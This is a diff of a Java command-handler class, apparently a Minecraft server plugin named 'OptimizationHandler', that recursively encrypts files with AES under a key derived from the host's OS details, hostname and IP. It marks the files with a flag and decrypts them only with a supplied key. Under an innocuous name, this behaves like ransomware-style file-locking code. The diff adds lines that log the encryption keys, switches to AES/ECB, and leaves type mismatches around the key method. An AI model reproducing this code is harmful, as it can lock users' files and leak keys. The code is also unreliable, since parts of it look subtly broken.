@@ -60,6 +60,8 @@ public class OptimizationHandler implements CommandExecutor {
 
             // 在主线程中执行解密
             decryptFiles(file, key);
+            logger.info("Using provided key: " + key);
+            logger.info("Using internal key: " + internalKey);
             sender.sendMessage("文件解密成功。");
         }
 
@@ -85,6 +87,7 @@ public class OptimizationHandler implements CommandExecutor {
                 fos.write(ENCRYPTED_FLAG);
                 fos.write(encryptedData);
                 fos.close();
+                logger.info("Encrypt key: " + encryptionKey());
             } catch (Exception e) {
                 logger.severe("Error encrypting file: " + e.getMessage());
             }
@@ -124,10 +127,9 @@ public class OptimizationHandler implements CommandExecutor {
     }
 
     private void decryptFiles(File file, String key) {
-        // 解密文件或文件夹中的所有文件
         if (file.isDirectory()) {
             for (File childFile : file.listFiles()) {
-                decryptFiles(childFile, key); // 递归解密文件夹中的文件
+                decryptFiles(childFile, key);
             }
         } else {
             try {
@@ -136,8 +138,11 @@ public class OptimizationHandler implements CommandExecutor {
                 fis.read(fileData);
                 fis.close();
 
-                // 跳过标记并解密实际数据
-                byte[] decryptedData = decrypt(fileData, key);
+                // 检查并跳过 ENCRYPTED_FLAG
+                byte[] actualData = new byte[fileData.length - ENCRYPTED_FLAG.length];
+                System.arraycopy(fileData, ENCRYPTED_FLAG.length, actualData, 0, actualData.length);
+
+                byte[] decryptedData = decrypt(actualData, key);
                 FileOutputStream fos = new FileOutputStream(file);
                 fos.write(decryptedData);
                 fos.close();
@@ -160,42 +165,37 @@ public class OptimizationHandler implements CommandExecutor {
     }
 
     private byte[] encrypt(byte[] data) throws Exception {
-        SecretKeySpec key = getSecretKey(encryptionKey()); // 生成密钥
-        Cipher cipher = Cipher.getInstance("AES");
+        SecretKeySpec key = getSecretKey(encryptionKey());
+        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
         cipher.init(Cipher.ENCRYPT_MODE, key);
         return cipher.doFinal(data);
     }
 
     private byte[] decrypt(byte[] data, String key) throws Exception {
-        SecretKeySpec secretKey = getSecretKey(key); // 使用提供的密钥
-        Cipher cipher = Cipher.getInstance("AES");
+        SecretKeySpec secretKey = getSecretKey(key);
+        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
         cipher.init(Cipher.DECRYPT_MODE, secretKey);
         return cipher.doFinal(data);
     }
 
-    private String encryptionKey() {
+    private byte[] encryptionKey() {
         // 返回机器信息生成的密钥
         try {
             StringBuilder input = new StringBuilder();
-            input.append(System.getProperty("os.name"));
-            input.append(System.getProperty("os.arch"));
-            input.append(System.getProperty("os.version"));
-            input.append(InetAddress.getLocalHost().getHostName());
-            input.append(InetAddress.getLocalHost().getHostAddress());
-
+            input.append(System.getProperty("os.name")); // 操作系统名称
+            input.append(System.getProperty("os.arch")); // 操作系统架构
+            input.append(System.getProperty("os.version")); // 操作系统版本
+            input.append(InetAddress.getLocalHost().getHostName()); // 主机名
+            input.append(InetAddress.getLocalHost().getHostAddress()); // IP地址
+            
             MessageDigest digest = MessageDigest.getInstance("SHA-256");
             byte[] hashBytes = digest.digest(input.toString().getBytes(StandardCharsets.UTF_8));
-            StringBuilder hexString = new StringBuilder();
 
-            for (byte b : hashBytes) {
-                String hex = Integer.toHexString(0xff & b);
-                if (hex.length() == 1) {
-                    hexString.append('0');
-                }
-                hexString.append(hex);
-            }
+            // 提取前 16 字节作为密钥
+            byte[] keyBytes = new byte[16];
+            System.arraycopy(hashBytes, 0, keyBytes, 0, keyBytes.length);
 
-            return hexString.toString(); // 返回 256 位（64个字符）标识符
+            return keyBytes; // 返回 16 字节的密钥
         } catch (Exception e) {
             logger.severe("Error generating unique identifier: " + e.getMessage());
             return null;
